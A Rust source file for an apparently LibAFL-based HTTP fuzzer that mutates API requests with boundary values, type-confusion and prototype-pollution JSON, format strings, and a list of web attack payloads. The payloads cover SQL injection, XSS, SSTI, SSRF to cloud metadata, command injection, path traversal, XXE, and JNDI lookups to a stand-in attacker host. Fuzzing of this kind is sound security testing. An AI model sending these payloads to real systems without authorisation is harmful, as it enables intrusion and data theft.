use std::borrow::Cow;
use std::num::NonZeroUsize;

use libafl::corpus::CorpusId;
use libafl::mutators::{MutationResult, Mutator};
use libafl::state::HasRand;
use libafl::Error;
use libafl_bolts::Named;
use libafl_bolts::rands::Rand;

use super::input::FuzzHttpRequest;

fn nz(val: usize) -> NonZeroUsize {
    NonZeroUsize::new(val).unwrap()
}

#[derive(Debug)]
pub struct ParamMutator {
    name: Cow<'static, str>,
}

impl ParamMutator {
    pub fn new() -> Self {
        Self {
            name: Cow::Borrowed("param_mutator"),
        }
    }
}

impl Named for ParamMutator {
    fn name(&self) -> &Cow<'static, str> {
        &self.name
    }
}

impl<S> Mutator<FuzzHttpRequest, S> for ParamMutator
where
    S: HasRand,
{
    fn mutate(&mut self, state: &mut S, input: &mut FuzzHttpRequest) -> Result<MutationResult, Error> {
        let choice = state.rand_mut().below(nz(4));

        match choice {
            0 => mutate_boundary_values(state, input),
            1 => mutate_type_confusion(state, input),
            2 => mutate_injection_payloads(state, input),
            _ => mutate_format_strings(state, input),
        }

        Ok(MutationResult::Mutated)
    }

    fn post_exec(&mut self, _state: &mut S, _new_corpus_id: Option<CorpusId>) -> Result<(), Error> {
        Ok(())
    }
}

fn mutate_boundary_values<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let boundary_values: &[&str] = &[
        "0",
        "-1",
        "1",
        "2147483647",    // INT_MAX
        "-2147483648",   // INT_MIN
        "2147483648",    // INT_MAX + 1
        "9999999999999999999", // overflow
        "9223372036854775807", // i64::MAX
        "-9223372036854775808", // i64::MIN
        "",
        " ",
        "null",
        "undefined",
        "NaN",
        "Infinity",
        "-Infinity",
        "0.0",
        "-0.0",
        "1e308",
        "1e-308",
        "true",
        "false",
    ];

    let idx = state.rand_mut().below(nz(boundary_values.len()));
    let value = boundary_values[idx].to_string();

    let target = state.rand_mut().below(nz(3));
    match target {
        0 => {
            if let Some(key) = input.query_params.keys().next().cloned() {
                input.query_params.insert(key, value);
            } else {
                input.query_params.insert("id".to_string(), value);
            }
        }
        1 => {
            if let Some(body) = &input.body {
                if let Ok(mut json) = serde_json::from_str::<serde_json::Value>(body) {
                    inject_boundary_into_json(state, &mut json, &value);
                    input.body = Some(json.to_string());
                }
            } else {
                input.body = Some(format!("{{\"value\": {}}}", value));
            }
        }
        _ => {
            if input.url.contains('{') || input.url.ends_with('/') {
                input.url.push_str(&value);
            } else if let Some(pos) = input.url.rfind('/') {
                input.url.truncate(pos + 1);
                input.url.push_str(&value);
            }
        }
    }
}

fn mutate_type_confusion<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let type_payloads: &[&str] = &[
        "[]",                    // array where object expected
        "{}",                    // object where scalar expected
        "[1,2,3]",              // array where string expected
        "\"string_not_int\"",   // string where int expected
        "12345",                // number where string expected
        "true",                 // bool where string expected
        "null",                 // null anywhere
        "{\"__proto__\": {\"admin\": true}}", // prototype pollution
        "[null, null, null]",   // null array
        "\"\"",                 // empty string
        "{\"toString\": \"evil\"}", // toString override
        "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
    ];

    let idx = state.rand_mut().below(nz(type_payloads.len()));
    let payload = type_payloads[idx];

    if let Some(body) = &input.body {
        if let Ok(mut json) = serde_json::from_str::<serde_json::Value>(body) {
            if let serde_json::Value::Object(ref mut map) = json {
                if let Some(key) = map.keys().next().cloned() {
                    if let Ok(new_val) = serde_json::from_str::<serde_json::Value>(payload) {
                        map.insert(key, new_val);
                    }
                }
            }
            input.body = Some(json.to_string());
        } else {
            input.body = Some(payload.to_string());
        }
    } else {
        input.body = Some(payload.to_string());
        input.headers.insert("Content-Type".to_string(), "application/json".to_string());
    }
}

fn mutate_injection_payloads<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let payloads: &[&str] = &[
        // SQL injection
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT null,null,null--",
        "' OR 1=1#",
        "admin'--",
        "1; WAITFOR DELAY '0:0:5'--",
        // NoSQL injection
        "{\"$gt\": \"\"}",
        "{\"$ne\": null}",
        "{\"$regex\": \".*\"}",
        // XSS
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
        "'\"><script>alert(document.cookie)</script>",
        // SSTI
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{%import os%}{{os.popen('id').read()}}",
        // SSRF
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]:80/",
        "file:///etc/passwd",
        // Command injection
        "; id",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        // Path traversal
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f",
        // LDAP/JNDI
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/a}",
        // XXE reference
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        // Unicode tricks
        "\u{0000}",
        "\u{FEFF}admin",
        "admin\u{0085}",
    ];

    let idx = state.rand_mut().below(nz(payloads.len()));
    let payload = payloads[idx].to_string();

    let target = state.rand_mut().below(nz(4));
    match target {
        0 => {
            let param_names = ["q", "search", "id", "name", "input", "data", "filter", "query"];
            let name_idx = state.rand_mut().below(nz(param_names.len()));
            input.query_params.insert(param_names[name_idx].to_string(), payload);
        }
        1 => {
            if let Some(body) = &input.body {
                if let Ok(mut json) = serde_json::from_str::<serde_json::Value>(body) {
                    inject_payload_into_json(state, &mut json, &payload);
                    input.body = Some(json.to_string());
                } else {
                    input.body = Some(format!("{{\"data\": \"{}\"}}", payload.replace('"', "\\\"")));
                }
            } else {
                input.body = Some(format!("{{\"input\": \"{}\"}}", payload.replace('"', "\\\"")));
            }
        }
        2 => {
            input.url.push('/');
            input.url.push_str(&payload);
        }
        _ => {
            input.headers.insert("X-Forwarded-For".to_string(), payload.clone());
            input.headers.insert("Referer".to_string(), payload);
        }
    }
}

fn mutate_format_strings<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let format_strs: &[&str] = &[
        "%s%s%s%s%s",
        "%x%x%x%x",
        "%n%n%n%n",
        "%d%d%d%d",
        "%p%p%p%p",
        "{0}{1}{2}{3}",
        "AAAA%08x.%08x.%08x.%08x",
        "%99999999s",
    ];

    let idx = state.rand_mut().below(nz(format_strs.len()));
    let payload = format_strs[idx].to_string();

    let target = state.rand_mut().below(nz(2));
    match target {
        0 => {
            if let Some(key) = input.query_params.keys().next().cloned() {
                input.query_params.insert(key, payload);
            } else {
                input.query_params.insert("fmt".to_string(), payload);
            }
        }
        _ => {
            if let Some(body) = &input.body {
                if let Ok(mut json) = serde_json::from_str::<serde_json::Value>(body) {
                    inject_payload_into_json(state, &mut json, &payload);
                    input.body = Some(json.to_string());
                }
            }
        }
    }
}

fn inject_boundary_into_json<S: HasRand>(
    state: &mut S,
    val: &mut serde_json::Value,
    boundary: &str,
) {
    match val {
        serde_json::Value::Object(map) => {
            if let Some(key) = map.keys().next().cloned() {
                if let Ok(num) = boundary.parse::<i64>() {
                    map.insert(key, serde_json::Value::Number(num.into()));
                } else {
                    map.insert(key, serde_json::Value::String(boundary.to_string()));
                }
            }
        }
        serde_json::Value::Array(arr) => {
            if !arr.is_empty() {
                let idx = state.rand_mut().below(nz(arr.len()));
                arr[idx] = serde_json::Value::String(boundary.to_string());
            }
        }
        _ => {
            *val = serde_json::Value::String(boundary.to_string());
        }
    }
}

fn inject_payload_into_json<S: HasRand>(
    state: &mut S,
    val: &mut serde_json::Value,
    payload: &str,
) {
    match val {
        serde_json::Value::Object(map) => {
            let keys: Vec<String> = map.keys().cloned().collect();
            if !keys.is_empty() {
                let idx = state.rand_mut().below(nz(keys.len()));
                map.insert(keys[idx].clone(), serde_json::Value::String(payload.to_string()));
            }
        }
        serde_json::Value::Array(arr) => {
            if !arr.is_empty() {
                let idx = state.rand_mut().below(nz(arr.len()));
                arr[idx] = serde_json::Value::String(payload.to_string());
            } else {
                arr.push(serde_json::Value::String(payload.to_string()));
            }
        }
        serde_json::Value::String(s) => {
            *s = payload.to_string();
        }
        _ => {
            *val = serde_json::Value::String(payload.to_string());
        }
    }
}
